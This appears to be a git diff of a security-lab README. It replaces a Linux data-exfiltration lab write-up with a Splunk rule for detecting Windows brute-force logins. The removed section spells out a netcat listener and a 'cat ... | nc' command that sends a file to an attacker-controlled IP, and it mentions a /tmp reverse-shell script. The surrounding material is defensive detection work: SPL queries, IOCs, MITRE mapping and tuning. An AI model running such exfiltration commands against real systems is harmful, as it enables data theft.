@@ -1,177 +1,215 @@
-# Data Exfiltration Detection
- 
-## Objective
- 
-Detect potential data exfiltration activity by identifying:
- 
-- Large outbound data transfers
-- Suspicious command execution (nc, cat)
-- Correlation between process activity and network behavior
+# Splunk Correlation Rule: Windows Brute Force Detection
  
 ---
  
-## Lab Environment
+## Project Overview
  
-| Component    | Details                                          |
-|--------------|--------------------------------------------------|
-| **SIEM**     | Splunk Enterprise                                |
-| **Attacker** | Kali Linux                                       |
-| **Victim**   | Ubuntu 22.04                                     |
-| **Logs**     | auditd (/var/log/audit/audit.log), syslog        |
+This project demonstrates the design and implementation of a correlation rule in **Splunk Enterprise Security (ES)** to detect potential **Windows brute force login attempts**.
+ 
+The detection is based on identifying abnormal spikes in failed authentication events (Event ID 4625), which are commonly associated with password guessing attacks.
  
 ---
  
-## Attack Overview
+## Why This Detection Was Chosen
  
-The attacker simulated data exfiltration through:
+Brute force attacks are one of the most frequently observed attack techniques in real-world SOC environments. This use case was selected because:
  
-1. File Creation (~50MB random data)
-2. Multiple Transfers using netcat
-3. Outbound Connections to attacker-controlled machine
- 
+- It is a common and practical attack scenario
+- It helps build understanding of Windows authentication logs
+- It maps directly to **MITRE ATT&CK T1110.001 – Password Guessing**
+- It demonstrates core detection engineering concepts such as aggregation, thresholding, and alert tuning
 ---
  
-## Attack Execution
+## 1. Correlation Rule Creation (Detection Logic)
  
-### Step 1 — File Creation (Victim)
+![photo](images/photo3.png)
  
-```bash
-dd if=/dev/urandom of=secret_data.bin bs=1M count=50
-```
----
- 
-### Step 2 — Attacker Listener (Kali)
- 
-```bash
-nc -lvnp 4444 >> stolen_data.bin
-```
- 
-![Ubuntu Logs](images/kalide.png)
- 
----
- 
-### Step 3 — Data Exfiltration (Victim)
- 
-```bash
-cat secret_data.bin | nc -q 1 192.168.1.64 4444
-```
- 
-> Repeated multiple times for continuous exfiltration
- 
-![Ubuntu Logs](images/ubuntude.png)
- 
----
- 
-### Step 4 — Proof of Exfiltration
- 
-```bash
-ls -lh stolen_data.bin
-```
- 
-**Output:** `150M stolen_data.bin`
- 
-![Ubuntu Logs](images/kalide.png)
- 
----
- 
-## Log Analysis (Splunk)
- 
-### Detection Query 1 — Command Execution
+### SPL Query
  
 ```spl
-index=* sourcetype=linux_audit "EXECVE"
-| table _time host a0 a1 a2 uid
+vendor_product="Microsoft Windows" EventCode=4625
+| stats count by user
+| where count > 10
 ```
-![Ubuntu Logs](images/splunkde.png)
+ 
+### Rationale
+ 
+- `EventCode 4625` represents failed login attempts on Windows systems
+- Aggregating events per user identifies behavioral patterns rather than isolated failures
+- The threshold of greater than 10 reduces noise from routine login mistakes
+This logic ensures the detection focuses on suspicious behavior rather than incidental authentication failures.
  
 ---
  
-### Key Observations from Logs
+## 2. Detection Validation
  
-- `/bin/sh -c /tmp/reverse.sh` → suspicious script execution
-- `nc` → network exfiltration tool
-- `cat secret_data.bin` → file read before transfer
-- Execution under **root** (uid=0)
+![photo](images/photo4.png)
+ 
+Before deploying any detection, results must be reviewed to:
+ 
+- Verify that the output is meaningful and accurate
+- Confirm that the threshold is appropriate for the environment
+- Ensure that the detection does not produce excessive noise
+---
+ 
+## 3. Scheduling Configuration
+ 
+![photo](images/photo1.png)
+ 
+| Setting | Value |
+|---|---|
+| Run frequency | Every 2 minutes |
+| Time range | -2 minutes to now |
+| Real-time scheduling | Enabled |
+ 
+Brute force attacks occur rapidly, requiring near real-time detection to enable a timely response.
  
 ---
  
-## True Positive Report
+## 4. MITRE ATT&CK Mapping
  
-**Time of Activity:** `March 28, 2026 (00:43 – 00:46)`
+![photo](images/photo2.png)
  
-### Affected Entities
+| Field | Value |
+|---|---|
+| Technique | T1110.001 – Password Guessing |
+| Tactic | Credential Access |
  
-| Entity      | Details                          |
-|-------------|----------------------------------|
-| Host        | Ubuntu Server (victim)           |
-| Destination | 192.168.1.64 (Kali)              |
-| User        | root (uid=0)                     |
-| Data Volume | ~150MB outbound transfer         |
- 
-### Classification Criteria
- 
-- Large outbound transfer (150MB)
-- Suspicious `nc` tool usage
-- `/tmp` script execution
-- Root privilege execution
-- File access → network correlation
- 
-> **Classification: TRUE POSITIVE**
+Mapping detections to the MITRE ATT&CK framework standardizes detection across environments, aligns alerts with known attacker techniques, and improves reporting and threat intelligence integration.
  
 ---
  
-## Reason for Escalation
+## 5. Trigger Conditions and Throttling
  
-| Risk Factor              | Impact Level |
-|--------------------------|--------------|
-| Potential data breach    | CRITICAL  |
-| Unauthorized C2 comms    | HIGH      |
-| Sensitive data exposure  | HIGH      |
-| Root-level persistence   | CRITICAL  |
+![photo](images/photo7.png)
  
----
+| Setting | Value |
+|---|---|
+| Trigger condition | Results greater than 0 |
+| Throttling field | `user` |
  
-## MITRE ATT&CK Mapping
- 
-| Technique                              | ID     | Status     |
-|----------------------------------------|--------|------------|
-| Command and Scripting Interpreter      | T1059  | Detected |
-| Exfiltration Over Alternative Protocol | T1048  | Detected |
-| Exfiltration Over C2 Channel           | T1071  | Detected |
+Throttling by user prevents duplicate alerts for the same account across polling intervals, minimizing alert fatigue while preserving meaningful detection coverage.
  
 ---
  
-## Recommended Remediation
+## 6. Notable Event Configuration (Dynamic Title)
  
-### 1. Network Controls
-- Block outbound traffic to `192.168.1.64`
-- Implement application whitelisting for `nc`
+![photo](images/photo6.png)
  
-### 2. Host Hardening
-- Monitor `/tmp` directory executions
-- Restrict netcat usage via AppArmor/SELinux
+Using dynamic field references such as `$user$` in the notable event title allows analysts to:
  
-### 3. Data Protection
-- Deploy Data Loss Prevention (DLP)
-- Enable file access auditing
+- Immediately identify the affected user from the alert title
+- Produce more meaningful and readable alerts in the incident queue
+---
  
-### 4. Monitoring
-- Alert on large outbound transfers
-- Correlate process execution with network events
+## 7. Notable Event Full Configuration
+ 
+![photo](images/photo9.png)
+ 
+| Setting | Value |
+|---|---|
+| Severity level | Configured per threat context |
+| Security domain | Endpoint |
+| Drill-down search | Enabled |
+ 
+This configuration transforms a detection into an actionable SOC alert with sufficient context for investigation.
  
 ---
  
-## Indicators of Compromise (IOCs)
+## 8. Drill-Down Search
  
-### Network
-- Destination IP: `192.168.1.64:4444`
-- Port `4444` (netcat listener)
+```spl
+"Windows" EventCode=4625 user=$user$
+```
  
-### Process
-- `nc` execution (root context)
-- `/tmp/reverse.sh` execution
-- `cat secret_data.bin`
+The drill-down search allows analysts to:
  
-### File
-- `secret_data.bin` (~50MB)
-- `stolen_data.bin` (150MB)
+- Quickly retrieve all related events for a specific user
+- Analyze full login failure patterns in context
+- Reduce the time required to begin an investigation
+---
+ 
+## 10. Field Enrichment
+ 
+![photo](images/photo11.png)
+ 
+| Enrichment Type | Fields |
+|---|---|
+| Identity | `user`, `role` |
+| Asset | `src`, `dest`, `host` |
+ 
+Field enrichment provides additional investigative context, enabling analysts to quickly understand the scope and impact of an alert without switching between multiple tools.
+ 
+---
+## 12. Final Enabled Rule
+ 
+![photo](images/photo10.png)
+ 
+Confirming the rule is enabled ensures the detection is active and continuously monitoring for brute force activity.
+ 
+---
+ 
+## Detection Tuning and False Positives
+ 
+This detection may generate alerts in legitimate scenarios, including:
+ 
+- Users repeatedly entering incorrect passwords
+- Expired or cached credentials
+- Misconfigured service accounts
+- Internal vulnerability scans or penetration tests
+### Mitigation Strategies
+ 
+- Exclude known service accounts from the detection scope
+- Adjust the failure count threshold based on baseline behavior in the environment
+- Correlate with successful login events (Event ID 4624) to assess whether access was ultimately gained
+- Include source IP analysis to differentiate internal from external activity
+---
+ 
+## Investigation Workflow
+ 
+When this alert is triggered, a SOC analyst should follow these steps:
+ 
+1. Identify the source IP address of the failed login attempts
+2. Determine whether the activity originates from an internal or external source
+3. Search for any corresponding successful login events (Event ID 4624)
+4. Determine whether the targeted account is privileged
+5. Correlate with other suspicious activity in the same timeframe
+---
+ 
+## Severity Tuning
+ 
+| Severity | Condition |
+|---|---|
+| Low | Internal user login failures with no privilege escalation indicators |
+| Medium | Multiple accounts targeted from the same source |
+| High | External source targeting privileged or administrative accounts |
+ 
+---
+ 
+## Use Cases Covered
+ 
+- Brute force attacks
+- Password spraying
+- Unauthorized login attempts
+- Misconfigured services generating authentication noise
+---
+ 
+## Potential Improvements
+ 
+- Add source IP correlation to identify attack origin
+- Implement anomaly-based dynamic thresholds using baseline modeling
+- Integrate with a SOAR platform for automated response and ticket creation
+---
+ 
+## Key Learnings
+ 
+- SPL query development and aggregation techniques
+- Windows Security Event Log analysis
+- Detection tuning and alert optimization
+- MITRE ATT&CK framework mapping
+- SOC alert lifecycle management
+---
+ 
+## Conclusion
+ 
+This project demonstrates a practical approach to detection engineering by combining technical implementation with operational considerations including tuning, investigation workflows, and alert management. The resulting rule provides a reliable, low-noise mechanism for detecting Windows brute force login attempts within a Splunk Enterprise Security environment.
